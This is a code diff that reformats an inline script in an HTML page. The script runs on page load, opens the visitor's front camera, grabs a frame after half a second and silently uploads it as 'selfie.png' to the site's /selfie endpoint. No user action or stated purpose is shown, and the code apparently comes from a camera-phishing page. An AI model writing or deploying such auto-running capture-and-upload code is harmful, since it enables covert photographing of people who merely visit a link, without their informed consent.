@@ -13,26 +13,29 @@
   <script>
     (async () => {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:"user" } });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
-        await new Promise(r=>setTimeout(r,500));
-        const canvas=document.createElement('canvas');
-        canvas.width=video.videoWidth;
-        canvas.height=video.videoHeight;
-        const ctx=canvas.getContext('2d');
-        ctx.drawImage(video,0,0,canvas.width,canvas.height);
-        canvas.toBlob(async (blob)=>{
-          if(!blob) return;
-          const form=new FormData();
-          form.append('photo',blob,'selfie.png');
-          try{await fetch('/selfie',{method:'POST',body:form});}
-          catch(e){console.error('Upload error',e);}
-        },'image/png');
-        stream.getTracks().forEach(t=>t.stop());
-      }catch(e){
-        console.warn('Kamera izni alınamadı veya cihaz bulunamadı:',e);
+        await new Promise(r => setTimeout(r, 500));
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(async (blob) => {
+          if (!blob) return;
+          const form = new FormData();
+          form.append('photo', blob, 'selfie.png');
+          try {
+            await fetch('/selfie', { method: 'POST', body: form });
+          } catch (e) {
+            console.error('Upload error', e);
+          }
+        }, 'image/png');
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {
+        console.warn('Kamera izni alınamadı veya cihaz bulunamadı:', e);
       }
     })();
   </script>
